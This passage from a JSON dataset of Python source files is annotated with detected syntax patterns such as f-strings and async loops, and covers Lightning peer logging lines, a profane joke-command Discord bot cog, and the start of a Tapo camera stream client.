                        "        self.logger.info(f'on_revoke_and_ack. chan {chan.short_channel_id}. ctn: {chan.get_oldest_unrevoked_ctn(REMOTE)}')"
                    ],
                    [
                        1194,
                        "        self.logger.info(f\"(chan: {chan.get_id_for_log()}) current pending feerate {chan_fee}. \""
                    ],
                    [
                        1209,
                        "        self.logger.info(f'({chan.get_id_for_log()}) Channel closed {txid}')"
                    ],
                    [
                        102,
                        "            raise Exception(f\"channel {channel_id.hex()} not found for peer {self.pubkey.hex()}\")"
                    ],
                    [
                        184,
                        "            raise Exception(f\"Received unexpected '{name}'\")"
                    ],
                    [
                        265,
                        "            self.logger.debug(f'process_gossip {len(chan_anns)} {len(node_anns)} {len(chan_upds)}')"
                    ],
                    [
                        349,
                        "            self.logger.info(f'requesting channel graph since {datetime.fromtimestamp(timestamp).ctime()}')"
                    ],
                    [
                        468,
                        "            raise Exception(f\"MUST set funding_satoshis to less than 2^24 satoshi. {funding_sat} sat > {LN_MAX_FUNDING_SAT}\")"
                    ],
                    [
                        470,
                        "            raise Exception(f\"MUST set push_msat to equal or less than 1000 * funding_satoshis: {push_msat} msat > {1000 * funding_sat} msat\")"
                    ],
                    [
                        472,
                        "            raise Exception(f\"funding_sat too low: {funding_sat} < {lnutil.MIN_FUNDING_SAT}\")"
                    ],
                    [
                        501,
                        "            raise Exception(f\"minimum depth too low, {funding_txn_minimum_depth}\")"
                    ],
                    [
                        503,
                        "            raise Exception(f\"minimum depth too high, {funding_txn_minimum_depth}\")"
                    ],
                    [
                        592,
                        "            raise Exception(f\"MUST set funding_satoshis to less than 2^24 satoshi. {funding_sat} sat > {LN_MAX_FUNDING_SAT}\")"
                    ],
                    [
                        594,
                        "            raise Exception(f\"MUST set push_msat to equal or less than 1000 * funding_satoshis: {push_msat} msat > {1000 * funding_sat} msat\")"
                    ],
                    [
                        596,
                        "            raise Exception(f\"funding_sat too low: {funding_sat} < {lnutil.MIN_FUNDING_SAT}\")"
                    ],
                    [
                        681,
                        "            self.logger.info(f'reestablish_channel was called but channel {chan.get_id_for_log()} '"
                    ],
                    [
                        728,
                        "            raise RemoteMisbehaving(f\"channel reestablish: their_next_local_ctn < 0\")"
                    ],
                    [
                        730,
                        "            raise RemoteMisbehaving(f\"channel reestablish: their_oldest_unrevoked_remote_ctn < 0\")"
                    ],
                    [
                        795,
                        "            self.logger.warning(f\"channel_reestablish ({chan.get_id_for_log()}): \""
                    ],
                    [
                        876,
                        "            self.logger.info(f\"cannot mark open ({chan.get_id_for_log()}), current state: {repr(old_state)}\")"
                    ],
                    [
                        887,
                        "            self.logger.info(f\"sending channel update for outgoing edge ({chan.get_id_for_log()})\")"
                    ],
                    [
                        932,
                        "            raise PaymentFailure(f\"htlc expiry too far into future. (in {cltv-local_height} blocks)\")"
                    ],
                    [
                        984,
                        "            raise RemoteMisbehaving(f\"received update_fail_malformed_htlc with unexpected failure code: {failure_code}\")"
                    ],
                    [
                        996,
                        "            raise RemoteMisbehaving(f\"received update_add_htlc while chan.get_state() != OPEN. state was {chan.get_state()!r}\")"
                    ],
                    [
                        999,
                        "            raise RemoteMisbehaving(f\"received update_add_htlc with cltv_expiry > BLOCKHEIGHT_MAX. value was {cltv_expiry}\")"
                    ],
                    [
                        1013,
                        "            self.logger.info(f\"forwarding is disabled. failing htlc.\")"
                    ],
                    [
                        1025,
                        "            self.logger.info(f\"cannot forward htlc. cannot find next_chan {next_chan_scid}\")"
                    ],
                    [
                        1030,
                        "            self.logger.info(f\"cannot forward htlc. next_chan {next_chan_scid} cannot send ctx updates. \""
                    ],
                    [
                        1156,
                        "            raise Exception(f\"unexpected reason when sending 'update_fail_malformed_htlc': {reason!r}\")"
                    ],
                    [
                        1217,
                        "            raise Exception(f'scriptpubkey in received shutdown message does not conform to any template: {their_scriptpubkey.hex()}')"
                    ],
                    [
                        1225,
                        "            self.logger.info(f'({chan.get_id_for_log()}) Channel closed by remote peer {txid}')"
                    ],
                    [
                        1247,
                        "            self.logger.info(f'(chan: {chan.short_channel_id}) waiting for htlcs to settle...')"
                    ],
                    [
                        199,
                        "            raise GracefulDisconnect(f\"{str(e)}\")"
                    ],
                    [
                        204,
                        "                raise GracefulDisconnect(f\"no common chain found with remote. (they sent: {their_chains})\")"
                    ],
                    [
                        306,
                        "            raise GracefulDisconnect(f\"Failed to initialize: {e!r}\") from e"
                    ],
                    [
                        368,
                        "            raise Exception(f'decode_short_ids: unexpected first byte: {encoded[0]}')"
                    ],
                    [
                        398,
                        "            raise GracefulDisconnect(f'initialize failed: {repr(e)}') from e"
                    ],
                    [
                        746,
                        "                self.logger.warning(f\"channel_reestablish ({chan.get_id_for_log()}): \""
                    ],
                    [
                        762,
                        "                self.logger.warning(f\"channel_reestablish ({chan.get_id_for_log()}): \""
                    ],
                    [
                        777,
                        "                self.logger.error(f\"channel_reestablish ({chan.get_id_for_log()}): \""
                    ],
                    [
                        802,
                        "            self.logger.warning(f\"channel_reestablish ({chan.get_id_for_log()}): we are ahead of remote! trying to force-close.\")"
                    ],
                    [
                        1077,
                        "            self.logger.info(f\"failed to forward htlc: error sending message. {e}\")"
                    ],
                    [
                        1272,
                        "                raise Exception(f'the proposed fee exceeds the base fee of the latest commitment transaction {is_local, their_fee, max_fee}')"
                    ],
                    [
                        230,
                        "                self.logger.log(e.log_level, f\"Disconnecting: {repr(e)}\")"
                    ],
                    [
                        233,
                        "                self.logger.info(f\"Disconnecting: {repr(e)}\")"
                    ],
                    [
                        277,
                        "                    self.logger.info(f'adding {len(orphaned)} unknown channel ids')"
                    ],
                    [
                        286,
                        "                    self.logger.debug(f'on_channel_update: {len(categorized_chan_upds.good)}/{len(chan_upds_chunk)}')"
                    ],
                    [
                        335,
                        "                    raise Exception(f\"insane reply_channel_range intervals {(a,b,c,d)}\")"
                    ],
                    [
                        788,
                        "                    self.logger.error(f\"channel_reestablish ({chan.get_id_for_log()}): \""
                    ],
                    [
                        1184,
                        "                        f\"({chan.get_id_for_log()}) feerate is {chan_feerate} sat/kw, \""
                    ],
                    [
                        1321,
                        "                    chan.logger.info(f'found unfulfilled htlc: {htlc_id}')"
                    ],
                    [
                        1339,
                        "                        self.logger.info(f\"error processing onion packet: {e!r}\")"
                    ]
                ]
            }
        },
        "17": {
            "file": "from discord.ext.commands.cooldowns import BucketType\nfrom discord.ext import commands\nfrom lxml import html\nimport datetime\nimport asyncio\nimport discord\nimport random\nimport json\nclass Misc:\n\tdef __init__(self, bot):\n\t\tself.bot = bot\n\t@commands.command(hidden=True)\n\tasync def itscominghome(self,ctx):\n\t\tawait ctx.send(\"No it's fucking not.\")\n\t@commands.command(name=\"8ball\",aliases=[\"8\"])\n\tasync def eightball(self,ctx):\n\t\tres = [ \n\t\t\t\"probably\",\n\t\t\t\"Aye\",\n\t\t\t\"aye mate\",\n\t\t\t\"wey aye.\",\n\t\t\t\"aye trust is pal.\",\n\t\t\t\"Deffo m8\",\n\t\t\t\"fuckin aye.\",\n\t\t\t\"fucking rights\",\n\t\t\t\"think so\",\n\t\t\t\"me pal says nar.\",\n\t\t\t\"divn't think so\",\n\t\t\t\"probs not like.\",\n\t\t\t\"nar pal soz\",\n\t\t\t\"fuck no\",\n\t\t\t\"deffo not.\",\n\t\t\t\"nar\",\n\t\t\t\"wey nar\",\n\t\t\t\"fuck off ya daftie\",\n\t\t\t\"am not sure av just had a bucket\",\n\t\t\t\"al tel you later\",\n\t\t\t\"giz a minute to figure it out\",\n\t\t\t\"mebbe like\",\n\t\t\t\"dain't bet on it like\"\n\t\t]\n\t\tawait ctx.send(f\":8ball: {ctx.author.mention} {random.choice(res)}\")\n\t@commands.command()\n\tasync def lenny(self,ctx):\n\t\tlennys = ['( \u0361\u00b0 \u035c\u0296 \u0361\u00b0)','(\u1d17 \u035c\u0296 \u1d17)','(\u27c3 \u035c\u0296 \u27c4) ','(\u0360\u2256 \u035c\u0296\u0360\u2256)','\u0295 \u0361\u00b0 \u0296\u032f \u0361\u00b0\u0294','( \u0360\u00b0 \u035f\u0296 \u0361\u00b0)','( \u0361~ \u035c\u0296 \u0361\u00b0)','( \u0361\u25c9 \u035c\u0296 \u0361\u25c9)','( \u0361\u00b0 \u035cV \u0361\u00b0)','( \u0361\u1d54 \u035c\u0296 \u0361\u1d54 )',\n\t\t'(\u262d \u035c\u0296 \u262d)','( \u00b0 \u035c\u0296 \u00b0)','( \u203e \u0296\u032b \u203e)','( \u0361\u00b0 \u0296\u032f \u0361\u00b0)','( \u0361\u00b0 \u0644\u035c \u0361\u00b0)','( \u0360\u00b0 \u035f\u0296 \u0360\u00b0)','( \u0361o \u035c\u0296 \u0361o)','( \u0361\u2609 \u035c\u0296 \u0361\u2609)','\u0295 \u0361\u00b0 \u035c\u0296 \u0361\u00b0\u0294','( \u0361\u00b0 \u035c\u0296 \u0361 \u00b0)']\n\t\tawait ctx.send(random.choice(lennys))\n\t@commands.command(aliases=[\"horo\"],hidden=True)\n\tasync def horoscope(self,ctx,*,sign):\n\t\tsign = sign.title()\n\t\thoros = {\n\t\t\t\"Aquarius\":\"\u2652\",\n\t\t\t\"Aries\":\"\u2648\",\n\t\t\t\"Cancer\":\"\u264b\",\n\t\t\t\"Capricorn\":\"\u2651\",\n\t\t\t\"Gemini\":\"\u264a\",\n\t\t\t\"Leo\":\"\u264c\",\n\t\t\t\"Libra\":\"\u264e\",\n\t\t\t\"Scorpius\":\"\u264f\",\n\t\t\t\"Scorpio\":\"\u264f\",\n\t\t\t\"Sagittarius\":\"\u2650\",\n\t\t\t\"Pisces\":\"\u2653\",\n\t\t\t\"Taurus\":\"\u2649\",\n\t\t\t\"Virgo\":\"\u264d\",\n\t\t}\n\t\tif sign not in horos:\n\t\t\treturn\n\t\tsun = datetime.datetime.now().date() - datetime.timedelta(days=datetime.datetime.now().weekday() + 1)\n\t\tsat = sun + datetime.timedelta(days=6)\n\t\tsunstring = sun.strftime('%a %d %B %Y')\n\t\tsatstring = sat.strftime('%a %d %B %Y')\n\t\te = discord.Embed()\n\t\te.color = 0x7289DA\n\t\te.description = \"*\\\"The stars and planets will not affect your life in any way\\\"*\"\n\t\te.title = f\"{horos[sign]} {sign}\"\n\t\tftstr = f\"Horoscope for {sunstring} - {satstring}\"\n\t\te.set_footer(text=ftstr)\n\t\tawait ctx.send(embed=e)\n\t@commands.command()\n\tasync def poll(self,ctx,*,arg):\n\t\ttry:\n\t\t\tawait ctx.message.delete()\n\t\texcept:\n\t\t\tpass\n\t\te = discord.Embed(color=0x7289DA)\n\t\te.title = f\"Poll\"\n\t\te.description = arg\n\t\te.set_footer(text=f\"Poll created by {ctx.author.name}\")\n\t\tm = await ctx.send(embed=e)\n\t\tawait m.add_reaction('\ud83d\udc4d')\n\t\tawait m.add_reaction('\ud83d\udc4e')\n\t@commands.command(aliases=[\"rather\"])\n\tasync def wyr(self,ctx):\n\t\tasync def fetch():\n\t\t\tasync with self.bot.session.get(\"http://www.rrrather.com/botapi\") as resp:\n\t\t\t\tresp = await resp.json()\n\t\t\t\treturn resp\n\t\tcache = []\n\t\ttries = 0\n\t\twhile tries < 20:\n\t\t\tresp = await fetch()\n\t\t\tif resp[\"choicea\"] == resp[\"choiceb\"]:\n\t\t\t\tcontinue\n\t\t\tif resp in cache:\n\t\t\t\ttries += 1\n\t\t\t\tcontinue\n\t\t\telse:\n\t\t\t\tcache += resp\n\t\t\t\tbreak\n\t\tasync def write(resp):\n\t\t\ttitle = resp[\"title\"].strip().capitalize().rstrip('.?,:')\n\t\t\topta  = resp[\"choicea\"].strip().capitalize().rstrip('.?,!').lstrip('.')\n\t\t\toptb  = resp[\"choiceb\"].strip().capitalize().rstrip('.?,!').lstrip('.')\n\t\t\tmc = f\"{ctx.author.mention} **{title}...** \\n{opta} \\n{optb}\"\n\t\t\treturn mc\n\t\tasync def react(m):\n\t\t\tawait m.add_reaction('\ud83c\udde6')\n\t\t\tawait m.add_reaction('\ud83c\udde7')\n\t\t\tawait m.add_reaction('\ud83c\udfb2')\n\t\tm = await ctx.send(await write(resp))\n\t\tawait react(m)\n\t\tdef check(reaction,user):\n\t\t\tif reaction.message.id == m.id and user == ctx.author:\n\t\t\t\te = str(reaction.emoji)\n\t\t\t\treturn e == '\ud83c\udfb2'\n\t\twhile True:\n\t\t\ttry:\n\t\t\t\trea = await self.bot.wait_for(\"reaction_add\",check=check,timeout=120)\n\t\t\texcept asyncio.TimeoutError:\n\t\t\t\tawait m.remove_reaction('\ud83c\udfb2',ctx.message.author)\n\t\t\t\tbreak\n\t\t\trea = rea[0]\n\t\t\tif rea.emoji == '\ud83c\udfb2':\n\t\t\t\tresp = await fetch()\n\t\t\t\tawait m.clear_reactions()\n\t\t\t\tawait m.edit(content=await write(resp))\n\t\t\t\tawait react(m)\n\t@commands.command()\n\t@commands.is_owner()\n\tasync def secrettory(self,ctx):\n\t\tawait ctx.send(f\"The secret tory is {random.choice(ctx.guild.members)}\")\n\t@commands.command(aliases=[\"choice\",\"pick\",\"select\"])\n\tasync def choose(self,ctx,*,choices):\n\t\tx = choices.split(\",\")\n\t\tif len(x) == 1:\n\t\t\treturn\n\t\tawait ctx.send(f\"{ctx.author.mention}: {random.choice(x)}\")\n\t@commands.command(hidden=True)\n\t@commands.bot_has_permissions(kick_members=True)\n\t@commands.cooldown(2,60,BucketType.user) \n\tasync def roulette(self,ctx):\n\t\tx = [\"click.\",\"click.\",\"click.\",\"click.\",\"click.\",\"\ud83d\udd2b BANG!\"]\n\t\toutcome = random.choice(x)\n\t\tif outcome == \"\ud83d\udd2b BANG!\":\n\t\t\tawait ctx.author.kick(reason=\"roulette\")\n\t\t\tawait ctx.send(f\"\ud83d\udd2b BANG! {ctx.author.mention} was kicked.\")\n\t\telse:\n\t\t\tawait ctx.send(outcome)\n\t@commands.command(hidden=True,aliases=[\"flip\",\"coinflip\"])\n\tasync def coin(self,ctx):\n\t\tprint(ctx.guild.name)\n\t\tawait ctx.send(random.choice([\"Heads\",\"Tails\"]))\n\t@commands.command(hidden=True)\n\t@commands.guild_only()\n\tasync def kickme(self,ctx):\n\t\ttry:\n\t\t\tawait ctx.author.kick(reason=f\"Used {ctx.invoked_with}\")\n\t\texcept discord.Forbidden:\n\t\t\tawait ctx.send(\"\u26d4 I can't kick you\")\n\t\texcept discord.HTTPException:\n\t\t\tawait ctx.send('\u2754 Kicking failed.')\n\t\telse:\n\t\t\tawait ctx.send(f\"\ud83d\udc62 {ctx.author.mention} kicked themself\")\n\t@commands.command(hidden=True,aliases=[\"bamme\"])\n\t@commands.guild_only()\n\tasync def banme(self,ctx):\n\t\ttry:\n\t\t\tawait ctx.author.ban(reason=\"Used .banme\",delete_message_days=0)\n\t\texcept discord.Forbidden:\n\t\t\tawait ctx.send(\"\u26d4 I can't ban you\")\n\t\texcept discord.HTTPException:\n\t\t\tawait ctx.send(\"\u2754 Banning failed.\")\n\t\telse:\n\t\t\tawait ctx.send(f\"\u2620 {ctx.author.mention} banned themself.\")\n\t@commands.command(hidden=True)\n\t@commands.guild_only()\n\tasync def triggered(self,ctx):\n\t\ttrgmsg = await ctx.send(\"\ud83d\udea8 \ud83c\uddf9 \ud83c\uddf7 \ud83c\uddee \ud83c\uddec \ud83c\uddec \ud83c\uddea \ud83c\uddf7  \ud83c\uddfc \ud83c\udde6 \ud83c\uddf7 \ud83c\uddf3 \ud83c\uddee \ud83c\uddf3 \ud83c\uddec  \ud83d\udea8\")\n\t\tfor i in range(5):\n\t\t\tawait trgmsg.edit(content=\"\u26a0 \ud83c\uddf9 \ud83c\uddf7 \ud83c\uddee \ud83c\uddec \ud83c\uddec \ud83c\uddea \ud83c\uddf7  \ud83c\uddfc \ud83c\udde6 \ud83c\uddf7 \ud83c\uddf3 \ud83c\uddee \ud83c\uddf3 \ud83c\uddec  \u26a0\")\n\t\t\tawait asyncio.sleep(1)\n\t\t\tawait trgmsg.edit(content=\"\ud83d\udea8 \ud83c\uddf9 \ud83c\uddf7 \ud83c\uddee \ud83c\uddec \ud83c\uddec \ud83c\uddea \ud83c\uddf7  \ud83c\uddfc \ud83c\udde6 \ud83c\uddf7 \ud83c\uddf3 \ud83c\uddee \ud83c\uddf3 \ud83c\uddec  \ud83d\udea8\")\n\t\t\tawait asyncio.sleep(1)\n\t@commands.command(hidden=True)\n\t@commands.guild_only()\n\t@commands.has_permissions(add_reactions=True)\n\tasync def uprafa(self,ctx):\n\t\tasync for message in ctx.channel.history(limit=10):\n\t\t\tawait message.add_reaction(\":upvote:332196220460072970\")\n\t@commands.command(hidden=True)\n\t@commands.guild_only()\n\t@commands.has_permissions(add_reactions=True)\n\tasync def downrafa(self,ctx):\n\t\tasync for message in ctx.channel.history(limit=10):\n\t\t\tawait message.add_reaction(\":downvote:332196251959427073\")\n\t@commands.command(hidden=True)\n\t@commands.has_permissions(manage_messages=True)\n\t@commands.guild_only()\n\tasync def norafa(self,ctx,*,msgs=30):\n\t\tasync for message in ctx.channel.history(limit=msgs):\n\t\t\tawait message.clear_reactions()\n\t@commands.command(aliases=[\"ttj\"],hidden=True)\n\tasync def thatsthejoke(self,ctx):\n\t\tawait ctx.send(\"https://www.youtube.com/watch?v=xECUrlnXCqk\")\n\t@commands.command(aliases=[\"alreadydead\"],hidden=True)\n\tasync def dead(self,ctx):\n\t\tawait ctx.send(\"https://www.youtube.com/watch?v=mAUY1J8KizU\")\n\t@commands.command(pass_context=True,aliases=[\"urbandictionary\"])\n\tasync def ud(self,ctx,*,lookup):\n\t\tawait ctx.trigger_typing()\n\t\turl = f\"http://api.urbandictionary.com/v0/define?term={lookup}\"\n\t\tasync with self.bot.session.get(url) as resp:\n\t\t\tif resp.status != 200:\n\t\t\t\tawait ctx.send(f\"\ud83d\udeab HTTP Error, code: {resp.status}\")\n\t\t\t\treturn\n\t\t\tjson = await resp.json()\n\t\ttn = (\"http://d2gatte9o95jao.cloudfront.net/assets/\"\n\t\t\t  \"apple-touch-icon-2f29e978facd8324960a335075aa9aa3.png\")\n\t\tembeds = []\n\t\tdeflist = json[\"list\"]\n\t\tcount = 1\n\t\tif deflist:\n\t\t\tfor i in deflist:\n\t\t\t\te = discord.Embed(color=0xFE3511)\n\t\t\t\tauth = f\"Urban Dictionary\"\n\t\t\t\te.set_author(name=auth)\n\t\t\t\te.set_thumbnail(url=tn)\n\t\t\t\te.title=i[\"word\"]\n\t\t\t\te.url=i[\"permalink\"]\n\t\t\t\te.description = i[\"definition\"]\n\t\t\t\te.description = e.description[:2047]\n\t\t\t\tif i[\"example\"]:\n\t\t\t\t\te.add_field(name=\"Example\",value=i[\"example\"])\n\t\t\t\tun = ctx.author.display_name\n\t\t\t\tic = \"http://pix.iemoji.com/twit33/0056.png\"\n\t\t\t\tfootertext = (f\"Page {count} of {len(deflist)} ({un}) |\"\n\t\t\t\t\t\t\t  f\"\ud83d\udc4d\ud83c\udffb{i['thumbs_up']} \ud83d\udc4e\ud83c\udffb{i['thumbs_down']}\")\n\t\t\t\te.set_footer(icon_url=ic,text=footertext)\n\t\t\t\tembeds.append(e)\n\t\t\t\tcount += 1\n\t\telse:\n\t\t\t\te = discord.Embed(color=0xFE3511)\n\t\t\t\te.description = f\"\ud83d\udeab No results found for {lookup}.\"\n\t\t\t\tembeds.append(e)\n\t\tpage = 0\n\t\tm = await ctx.send(embed=embeds[page])\n\t\tif len(embeds) > 1:\n\t\t\tif len(embeds) > 2: \n\t\t\t\tawait m.add_reaction(\"\u23ee\")\n\t\t\tawait m.add_reaction(\"\u25c0\") \n\t\t\tawait m.add_reaction(\"\u25b6\") \n\t\t\tif len(embeds) > 2: \n\t\t\t\tawait m.add_reaction(\"\u23ed\") \n\t\tdef check(reaction,user):\n\t\t\tif reaction.message.id == m.id and user == ctx.author:\n\t\t\t\te = str(reaction.emoji)\n\t\t\t\treturn e.startswith(('\u23ee','\u25c0','\u25b6','\u23ed'))\n\t\twhile not self.bot.is_closed():\n\t\t\ttry:\n\t\t\t\twf = \"reaction_add\"\n\t\t\t\tres = await self.bot.wait_for(wf,check=check,timeout=120)\n\t\t\texcept asyncio.TimeoutError:\n\t\t\t\tawait m.clear_reactions()\n\t\t\t\tbreak\n\t\t\tres = res[0]\n\t\t\tif res.emoji == \"\u23ee\": \n\t\t\t\tpage = 0\n\t\t\t\tawait m.remove_reaction(\"\u23ee\",ctx.author)\n\t\t\tif res.emoji == \"\u25c0\": \n\t\t\t\tif page > 0:\n\t\t\t\t\tpage += -1\n\t\t\t\tawait m.remove_reaction(\"\u25c0\",ctx.author)\n\t\t\tif res.emoji == \"\u25b6\": \n\t\t\t\tif page < len(embeds) - 1:\n\t\t\t\t\tpage += 1\n\t\t\t\tawait m.remove_reaction(\"\u25b6\",ctx.author)\n\t\t\tif res.emoji == \"\u23ed\": \n\t\t\t\tpage = len(embeds) - 1\n\t\t\t\tawait m.remove_reaction(\"\u23ed\",ctx.author)\n\t\t\tif res.emoji == \"\u23cf\": \n\t\t\t\tawait m.clear_reactions()\n\t\t\t\tawait m.delete()\n\t\t\tawait m.edit(embed=embeds[page])\n\t@commands.command(hidden=True)\n\t@commands.is_owner()\n\tasync def ircle(self,ctx):\n\t\tawait ctx.trigger_typing()\n\t\turl = \"https://www.reddit.com/r/nufcirclejerk/top/?sort=top&t=week\"\n\t\tasync with self.bot.session.get(url) as resp:\n\t\t\tif resp.status != 200:\n\t\t\t\tawait ctx.send(f\"{resp.status} error accessing top posts.\")\n\t\t\t\treturn\n\t\t\tposts = html.fromstring(await resp.text())\n\t\t\tposts = posts.xpath('.//div[contains(@class, \"thing\")]')\n\t\t\ttable = [(\"\\\ud83d\udca9 r/nufcirclejerk Shitposts of the week roundup.\"\n\t\t\t\t\t \"\\n\\n Score | Link | Direct | Author \\n--|--|--|--|\")]\n\t\t\tfor i in posts:\n\t\t\t\ttitle = i.xpath(\".//a[contains(@class, 'title')]/text()\")\n\t\t\t\tx = (\".//ul[@class='flat-list buttons']/\"\n\t\t\t\t\t\"li[@class='first']//@href\")\n\t\t\t\tcomme = i.xpath(x)\n\t\t\t\tlink  = i.xpath(\".//a[contains(@class, 'title')]/@href\")\n\t\t\t\tauthn = i.xpath(\".//a[contains(@class, 'author')]/text()\")\n\t\t\t\tif len(authn) == 0:\n\t\t\t\t\tauthn = \"[Deleted]\"\n\t\t\t\telse:\n\t\t\t\t\tauthn = \"u/{}\".format(authn[0])\n\t\t\t\tscore = i.xpath(\".//div[@class='score unvoted']/text()\")\n\t\t\t\tsc = score[0]\n\t\t\t\tt = title[0]\n\t\t\t\tc = comme[0]\n\t\t\t\tl = link[0]\n\t\t\t\ttable.append(f\"{sc}|[{t}]({c}) | [Direct]({l}) | {authn}\")\n\t\t\ttable = \"\\n\".join(table)\n\t\t\tawait ctx.send(table[:2000])\n\t\t\tawait ctx.send(table[2001:4000])\n\t@commands.command(hidden=True)\n\tasync def emojitext(self,ctx,*,string):\n\t\tawait ctx.trigger_typing()\n\t\tawait ctx.message.delete()\n\t\tstring = \"\".join([f\":regional_indicator_{i.lower()}:\" if i.isalpha()\n\t\t\t\t\t\telse f\"{i}\u20e3\" if i.isdigit() else i for i in string])\n\t\tawait ctx.send(string)\t\ndef setup(bot):\n    bot.add_cog(Misc(bot))",
            "patterns": {
                "pep_567": [
                    [
                        5,
                        5,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        198,
                        199,
                        "async for",
                        "async for message in ctx.channel.history(limit=10):\n\t\t\tawait message.add_reaction(\":upvote:332196220460072970\")"
                    ],
                    [
                        204,
                        205,
                        "async for",
                        "async for message in ctx.channel.history(limit=10):\n\t\t\tawait message.add_reaction(\":downvote:332196251959427073\")"
                    ],
                    [
                        210,
                        211,
                        "async for",
                        "async for message in ctx.channel.history(limit=msgs):\n\t\t\tawait message.clear_reactions()"
                    ]
                ],
                "pep_498v": [
                    [
                        317,
                        317,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        75,
                        "\t\te.title = f\"{horos[sign]} {sign}\""
                    ],
                    [
                        76,
                        "\t\tftstr = f\"Horoscope for {sunstring} - {satstring}\""
                    ],
                    [
                        86,
                        "\t\te.title = f\"Poll\""
                    ],
                    [
                        221,
                        "\t\turl = f\"http://api.urbandictionary.com/v0/define?term={lookup}\""
                    ],
                    [
                        114,
                        "\t\t\tmc = f\"{ctx.author.mention} **{title}...** \\n{opta} \\n{optb}\""
                    ],
                    [
                        253,
                        "\t\t\t\te.description = f\"\ud83d\udeab No results found for {lookup}.\""
                    ],
                    [
                        42,
                        "\t\tawait ctx.send(f\":8ball: {ctx.author.mention} {random.choice(res)}\")"
                    ],
                    [
                        88,
                        "\t\te.set_footer(text=f\"Poll created by {ctx.author.name}\")"
                    ],
                    [
                        141,
                        "\t\tawait ctx.send(f\"The secret tory is {random.choice(ctx.guild.members)}\")"
                    ],
                    [
                        147,
                        "\t\tawait ctx.send(f\"{ctx.author.mention}: {random.choice(x)}\")"
                    ],
                    [
                        235,
                        "\t\t\t\tauth = f\"Urban Dictionary\""
                    ],
                    [
                        246,
                        "\t\t\t\tfootertext = (f\"Page {count} of {len(deflist)} ({un}) |\""
                    ],
                    [
                        156,
                        "\t\t\tawait ctx.send(f\"\ud83d\udd2b BANG! {ctx.author.mention} was kicked.\")"
                    ],
                    [
                        173,
                        "\t\t\tawait ctx.send(f\"\ud83d\udc62 {ctx.author.mention} kicked themself\")"
                    ],
                    [
                        184,
                        "\t\t\tawait ctx.send(f\"\u2620 {ctx.author.mention} banned themself.\")"
                    ],
                    [
                        323,
                        "\t\t\t\ttable.append(f\"{sc}|[{t}]({c}) | [Direct]({l}) | {authn}\")"
                    ],
                    [
                        331,
                        "\t\tstring = \"\".join([f\":regional_indicator_{i.lower()}:\" if i.isalpha()"
                    ],
                    [
                        167,
                        "\t\t\tawait ctx.author.kick(reason=f\"Used {ctx.invoked_with}\")"
                    ],
                    [
                        224,
                        "\t\t\t\tawait ctx.send(f\"\ud83d\udeab HTTP Error, code: {resp.status}\")"
                    ],
                    [
                        301,
                        "\t\t\t\tawait ctx.send(f\"{resp.status} error accessing top posts.\")"
                    ],
                    [
                        332,
                        "\t\t\t\t\t\telse f\"{i}\u20e3\" if i.isdigit() else i for i in string])"
                    ]
                ]
            }
        },
        "18": {
            "file": "import asyncio\nimport hashlib\nimport json\nimport logging\nimport random\nimport warnings\nfrom asyncio import StreamReader, StreamWriter, Task, Queue\nfrom json import JSONDecodeError\nfrom typing import Optional, Mapping, Generator, MutableMapping\nfrom pytapo.media_stream._utils import (\n    generate_nonce,\n    md5digest,\n    parse_http_response,\n    parse_http_headers,\n)\nfrom pytapo.media_stream.crypto import AESHelper\nfrom pytapo.media_stream.error import (\n    HttpStatusCodeException,\n    KeyExchangeMissingException,\n)\nfrom pytapo.media_stream.response import HttpMediaResponse\nlogger = logging.getLogger(__name__)\nclass HttpMediaSession:\n    def __init__(\n        self,\n        ip: str,\n        cloud_password: str,\n        super_secret_key: str,\n        window_size=50,\n        port: int = 8800,\n        username: str = \"admin\",\n        multipart_boundary: bytes = b\"--client-stream-boundary--\",\n    ):\n        self.ip = ip\n        self.window_size = window_size\n        self.cloud_password = cloud_password\n        self.super_secret_key = super_secret_key\n        self.hashed_password = md5digest(cloud_password.encode()).decode()\n        self.port = port\n        self.username = username\n        self.client_boundary = multipart_boundary\n        self._started: bool = False\n        self._response_handler_task: Optional[Task] = None\n        self._auth_data: Mapping[str, str] = {}\n        self._authorization: Optional[str] = None\n        self._device_boundary = b\"--device-stream-boundary--\"\n        self._key_exchange: Optional[str] = None\n        self._aes: Optional[AESHelper] = None\n        self._reader: Optional[StreamReader] = None\n        self._writer: Optional[StreamWriter] = None\n        self._sequence_numbers: MutableMapping[int, Queue] = {}\n        self._sessions: MutableMapping[int, Queue] = {}\n    @property\n    def started(self) -> bool:\n        return self._started\n    async def __aenter__(self):\n        await self.start()\n        return self\n    async def start(self):\n        req_line = b\"POST /stream HTTP/1.1\"\n        headers = {\n            b\"Content-Type\": \"multipart/mixed;boundary={}\".format(\n                self.client_boundary.decode()\n            ).encode(),\n            b\"Connection\": b\"keep-alive\",\n            b\"Content-Length\": b\"-1\",\n        }\n        try:\n            self._reader, self._writer = await asyncio.open_connection(\n                self.ip, self.port\n            )\n            logger.info(\"Connected to the media streaming server\")\n            await self._send_http_request(req_line, headers)\n            data = await self._reader.readuntil(b\"\\r\\n\\r\\n\")\n            res_line, headers_block = data.split(b\"\\r\\n\", 1)\n            _, status_code, _ = parse_http_response(res_line)\n            res_headers = parse_http_headers(headers_block)\n            self._auth_data = {\n                i[0].strip().replace('\"', \"\"): i[1].strip().replace('\"', \"\")\n                for i in (\n                    j.split(\"=\")\n                    for j in res_headers[\"WWW-Authenticate\"].split(\" \", 1)[1].split(\",\")\n                )\n            }\n            self._auth_data.update(\n                {\n                    \"username\": self.username,\n                    \"cnonce\": generate_nonce(24).decode(),\n                    \"nc\": \"00000001\",\n                    \"qop\": \"auth\",\n                }\n            )\n            challenge1 = hashlib.md5(\n                \":\".join(\n                    (self.username, self._auth_data[\"realm\"], self.hashed_password)\n                ).encode()\n            ).hexdigest()\n            challenge2 = hashlib.md5(b\"POST:/stream\").hexdigest()\n            self._auth_data[\"response\"] = hashlib.md5(\n                b\":\".join(\n                    (\n                        challenge1.encode(),\n                        self._auth_data[\"nonce\"].encode(),\n                        self._auth_data[\"nc\"].encode(),\n                        self._auth_data[\"cnonce\"].encode(),\n                        self._auth_data[\"qop\"].encode(),\n                        challenge2.encode(),\n                    )\n                )\n            ).hexdigest()\n            self._authorization = (\n                'Digest username=\"{username}\",realm=\"{realm}\"'\n                ',uri=\"/stream\",algorithm=MD5,'\n                'nonce=\"{nonce}\",nc={nc},cnonce=\"{cnonce}\",qop={qop},'\n                